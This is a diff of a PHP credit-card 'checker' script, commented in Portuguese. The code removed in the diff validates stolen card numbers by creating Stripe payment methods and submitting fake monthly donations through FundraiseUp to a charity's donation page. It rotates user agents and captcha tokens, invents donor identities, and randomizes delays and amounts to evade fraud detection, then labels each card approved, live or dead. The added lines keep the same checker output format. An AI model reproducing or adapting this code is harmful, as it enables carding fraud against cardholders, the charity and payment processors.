-    echo "#ERRO ↝ [ Use: ?lista=numero|mes|ano|cvv ] ↝ [ Parâmetro não encontrado ] - ( 0.00s) | cyber";
+    $errorMsg = isset($response_array['message']) ? $response_array['message'] : 'Transação não autorizada';
+    echo '❌ Reprovada | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | ' . $errorMsg . ' | $cybersecofc';
 }
-
-function testar_cartao_fundraiseup($lista) {
-    global $user_agents, $fundraiseup_tokens, $fundraiseup_keys;
-    
-    $inicio = microtime(true);
-    
-    // Separar dados do cartão
-    $dados = explode('|', $lista);
-    if (count($dados) < 4) {
-        $tempo = round(microtime(true) - $inicio, 2);
-        return "#ERRO ↝ [{$lista}] ↝ [ Formato inválido. Use: numero|mes|ano|cvv ] - ( {$tempo}s) | cyber";
-    }
-    
-    $cartao = preg_replace('/\D/', '', trim($dados[0]));
-    $mes = str_pad(trim($dados[1]), 2, '0', STR_PAD_LEFT);
-    $ano = trim($dados[2]);
-    $cvv = trim($dados[3]);
-    
-    // Formatar ano
-    if (strlen($ano) == 4) {
-        $ano_curto = substr($ano, -2);
-        $ano_formatado = $ano;
-    } else {
-        $ano_curto = $ano;
-        $ano_formatado = '20' . $ano;
-    }
-    
-    $cartao_formatado = $cartao . '|' . $mes . '|' . $ano_formatado . '|' . $cvv;
-    
-    // Validações básicas
-    if (!preg_match('/^\d{13,19}$/', $cartao)) {
-        $tempo = round(microtime(true) - $inicio, 2);
-        return "#DIE ↝ [{$cartao_formatado}] ↝ [ Número de cartão inválido ] - ( {$tempo}s) | cyber";
-    }
-    if ($mes < 1 || $mes > 12) {
-        $tempo = round(microtime(true) - $inicio, 2);
-        return "#DIE ↝ [{$cartao_formatado}] ↝ [ Mês inválido ] - ( {$tempo}s) | cyber";
-    }
-    if (!preg_match('/^\d{3,4}$/', $cvv)) {
-        $tempo = round(microtime(true) - $inicio, 2);
-        return "#DIE ↝ [{$cartao_formatado}] ↝ [ CVV inválido ] - ( {$tempo}s) | cyber";
-    }
-    
-    // Selecionar tokens aleatórios para esta requisição
-    $user_agent = $user_agents[array_rand($user_agents)];
-    $fundraiseup_token = $fundraiseup_tokens[array_rand($fundraiseup_tokens)];
-    $fundraiseup_key = $fundraiseup_keys[array_rand($fundraiseup_keys)];
-    
-    $client_session_id = gerar_uuid();
-    $time_on_page = rand(30000, 180000);
-    $doador = gerar_doador();
-    
-    // PASSO 1: Stripe
-    $stripe_result = criar_payment_method_stripe($cartao, $mes, $ano_curto, $cvv, $client_session_id, $time_on_page, $user_agent);
-    
-    // Analisar Stripe
-    $analise_stripe = analisar_resposta_stripe($stripe_result);
-    
-    if ($analise_stripe['status'] === 'DIE') {
-        $tempo = round(microtime(true) - $inicio, 2);
-        return "#DIE ↝ [{$cartao_formatado}] ↝ [ {$analise_stripe['mensagem']} ] - ( {$tempo}s) | cyber";
-    }
-    
-    // Stripe aprovou - verificar CVC check
-    $cvc_check = $analise_stripe['cvc_check'];
-    $payment_method_id = $analise_stripe['payment_method_id'];
-    
-    // Delay maior e mais variado
-    sleep(rand(15, 25));
-    
-    // PASSO 2: FundraiseUp com tokens rotacionados
-    $fundraiseup_result = fazer_donate_fundraiseup($payment_method_id, $doador, $user_agent, $fundraiseup_token, $fundraiseup_key);
-    
-    $tempo = round(microtime(true) - $inicio, 2);
-    
-    // Analisar resultado final
-    return analisar_resposta_final($fundraiseup_result, $cartao_formatado, $cvc_check, $tempo);
-}
-
-function criar_payment_method_stripe($cartao, $mes, $ano, $cvv, $client_session_id, $time_on_page, $user_agent) {
-    global $hcaptcha_tokens;
-    
-    $ch = curl_init('https://api.stripe.com/v1/payment_methods');
-    
-    // Selecionar token hCaptcha aleatório
-    $hcaptcha_token = $hcaptcha_tokens[array_rand($hcaptcha_tokens)];
-    
-    $post_fields = http_build_query([
-        'type' => 'card',
-        'card[number]' => $cartao,
-        'card[cvc]' => $cvv,
-        'card[exp_month]' => $mes,
-        'card[exp_year]' => $ano,
-        'guid' => 'NA',
-        'muid' => 'NA',
-        'sid' => 'NA',
-        'pasted_fields' => 'number',
-        'payment_user_agent' => 'stripe.js/d68d8e2c5f; stripe-js-v3/d68d8e2c5f; split-card-element',
-        'referrer' => 'https://ifesworld.org',
-        'time_on_page' => $time_on_page,
-        'client_attribution_metadata[client_session_id]' => $client_session_id,
-        'client_attribution_metadata[merchant_integration_source]' => 'elements',
-        'client_attribution_metadata[merchant_integration_subtype]' => 'split-card-element',
-        'client_attribution_metadata[merchant_integration_version]' => '2017',
-        'key' => STRIPE_PUBLIC_KEY,
-        '_stripe_account' => STRIPE_ACCOUNT,
-        '_stripe_version' => '2025-02-24.acacia',
-        'radar_options[hcaptcha_token]' => $hcaptcha_token
-    ]);
-    
-    $headers = [
-        'Host: api.stripe.com',
-        'sec-ch-ua-platform: "Windows"',
-        'user-agent: ' . $user_agent,
-        'accept: application/json',
-        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
-        'content-type: application/x-www-form-urlencoded',
-        'sec-ch-ua-mobile: ?0',
-        'origin: https://js.stripe.com',
-        'sec-fetch-site: same-site',
-        'sec-fetch-mode: cors',
-        'sec-fetch-dest: empty',
-        'referer: https://js.stripe.com/',
-        'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-        'priority: u=1, i'
-    ];
-    
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_POST => true,
-        CURLOPT_POSTFIELDS => $post_fields,
-        CURLOPT_HTTPHEADER => $headers,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_ENCODING => 'gzip, deflate',
-        CURLOPT_TIMEOUT => 30,
-        CURLOPT_HEADER => false,
-    ]);
-    
-    $response = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    $response_data = json_decode($response, true);
-    
-    return [
-        'http_code' => $http_code,
-        'response' => $response_data
-    ];
-}
-
-function fazer_donate_fundraiseup($payment_method_id, $doador, $user_agent, $fundraiseup_token, $fundraiseup_key) {
-    global $captcha_tokens;
-    
-    $ch = curl_init('https://api.fundraiseup.com/paymentSession/' . $fundraiseup_token);
-    
-    // Selecionar token captcha aleatório
-    $captcha_token = $captcha_tokens[array_rand($captcha_tokens)];
-    
-    // Gerar IDs únicos
-    $client_id = rand(1000000000, 9999999999) . rand(1000000000, 9999999999);
-    $page_view_id = rand(1000000000, 9999999999) . rand(100000000, 999999999);
-    
-    // Variar valor da doação para parecer mais humano
-    $valores = [500, 1000, 2500, 5000, 10000];
-    $amount = $valores[array_rand($valores)];
-    
-    $payload = [
-        'donationType' => 'money',
-        'customer' => [
-            'firstName' => $doador['first_name'],
-            'lastName' => $doador['last_name'],
-            'email' => $doador['email'],
-            'phone' => $doador['phone'],
-            'consent' => [
-                'type' => 'general',
-                'general' => 'optedOut'
-            ]
-        ],
-        'donation' => [
-            'amount' => $amount,
-            'currency' => 'USD',
-            'frequency' => 'monthly',
-            'goalKey' => 'E784UJZ6'
-        ],
-        'captchaToken' => $captcha_token,
-        'initial' => [
-            'token' => $fundraiseup_token,
-            'key' => $fundraiseup_key,
-            'trackerParams' => [
-                'clientId' => $client_id,
-                'pageViewId' => $page_view_id,
-                'checkoutViewId' => $fundraiseup_token
-            ]
-        ],
-        'paymentMethodId' => $payment_method_id
-    ];
-    
-    $headers = [
-        'Host: api.fundraiseup.com',
-        'sec-ch-ua-platform: "Windows"',
-        'x-fru-embed-version: 260213-1542',
-        'user-agent: ' . $user_agent,
-        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
-        'content-type: text/plain; charset=utf-8',
-        'accept: */*',
-        'origin: https://ifesworld.org',
-        'referer: https://ifesworld.org/',
-        'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
-    ];
-    
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_POST => true,
-        CURLOPT_POSTFIELDS => json_encode($payload),
-        CURLOPT_HTTPHEADER => $headers,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_ENCODING => 'gzip, deflate',
-        CURLOPT_TIMEOUT => 30
-    ]);
-    
-    $response = curl_exec($ch);
-    curl_close($ch);
-    
-    return json_decode($response, true);
-}
-
-function analisar_resposta_stripe($resultado) {
-    if ($resultado['http_code'] !== 200) {
-        return [
-            'status' => 'DIE',
-            'mensagem' => 'Erro de conexão'
-        ];
-    }
-    
-    $response = $resultado['response'];
-    
-    // Sucesso - Payment Method criado
-    if (isset($response['id']) && strpos($response['id'], 'pm_') === 0) {
-        $cvc_check = $response['card']['checks']['cvc_check'] ?? 'unavailable';
-        
-        // Se CVC check falhou explicitamente
-        if ($cvc_check === 'fail') {
-            return [
-                'status' => 'DIE',
-                'mensagem' => 'Card Issuer Declined CVV',
-                'cvc_check' => $cvc_check
-            ];
-        }
-        
-        return [
-            'status' => 'LIVE',
-            'payment_method_id' => $response['id'],
-            'cvc_check' => $cvc_check,
-            'mensagem' => 'Payment Method OK'
-        ];
-    }
-    
-    // Erro Stripe
-    if (isset($response['error'])) {
-        $error = $response['error'];
-        $code = $error['code'] ?? '';
-        $message = $error['message'] ?? 'Erro desconhecido';
-        
-        // Mapear erros comuns
-        if ($code === 'incorrect_cvc' || strpos($message, 'cvc') !== false) {
-            return [
-                'status' => 'DIE',
-                'mensagem' => 'Card Issuer Declined CVV'
-            ];
-        }
-        
-        if ($code === 'expired_card') {
-            return [
-                'status' => 'DIE',
-                'mensagem' => 'Cartão Expirado'
-            ];
-        }
-        
-        if ($code === 'card_declined') {
-            return [
-                'status' => 'DIE',
-                'mensagem' => 'Cartão Recusado'
-            ];
-        }
-        
-        return [
-            'status' => 'DIE',
-            'mensagem' => $message
-        ];
-    }
-    
-    return [
-        'status' => 'DIE',
-        'mensagem' => 'Resposta inválida'
-    ];
-}
-
-function analisar_resposta_final($fundraiseup_result, $cartao_formatado, $cvc_check, $tempo) {
-    // Se FundraiseUp aprovou
-    if (isset($fundraiseup_result['id'])) {
-        return "#APROVADA ↝ [{$cartao_formatado}] ↝ [ Donate Aprovado ] - ( {$tempo}s) | cyber";
-    }
-    
-    // Verificar mensagem de erro do FundraiseUp
-    if (isset($fundraiseup_result['error'])) {
-        $erro = is_string($fundraiseup_result['error']) ? $fundraiseup_result['error'] : 
-                ($fundraiseup_result['error']['message'] ?? 'Erro desconhecido');
-        
-        // Se for o erro clássico de decline
-        if (strpos(strtolower($erro), 'declined') !== false) {
-            return "#DIE ↝ [{$cartao_formatado}] ↝ [ Card Issuer Declined CVV ] - ( {$tempo}s) | cyber";
-        }
-    }
-    
-    // Se Stripe aprovou (CVC pass) mas FundraiseUp deu erro diferente
-    if ($cvc_check === 'pass') {
-        return "#LIVE_CVV ↝ [{$cartao_formatado}] ↝ [ CVV Válido mas Donate Falhou ] - ( {$tempo}s) | cyber";
-    }
-    
-    // Fallback
-    return "#DIE ↝ [{$cartao_formatado}] ↝ [ Transação Negada ] - ( {$tempo}s) | cyber";
-}
-
-function gerar_doador() {
-    $nomes = ['John', 'James', 'Robert', 'Michael', 'William', 'David', 'Christopher', 'Daniel', 'Matthew', 'Andrew'];
-    $sobrenomes = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
-    
-    $primeiro = $nomes[array_rand($nomes)];
-    $ultimo = $sobrenomes[array_rand($sobrenomes)];
-    $email = strtolower($primeiro . '.' . $ultimo . rand(1000, 9999) . '@gmail.com');
-    
-    return [
-        'first_name' => $primeiro,
-        'last_name' => $ultimo,
-        'email' => $email,
-        'phone' => '+1 ' . rand(200, 999) . ' ' . rand(200, 999) . '-' . rand(1000, 9999)
-    ];
-}
-
-function gerar_uuid() {
-    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
-        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
-        mt_rand(0, 0xffff),
-        mt_rand(0, 0x0fff) | 0x4000,
-        mt_rand(0, 0x3fff) | 0x8000,
-        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
-    );
-}
-
 ?>
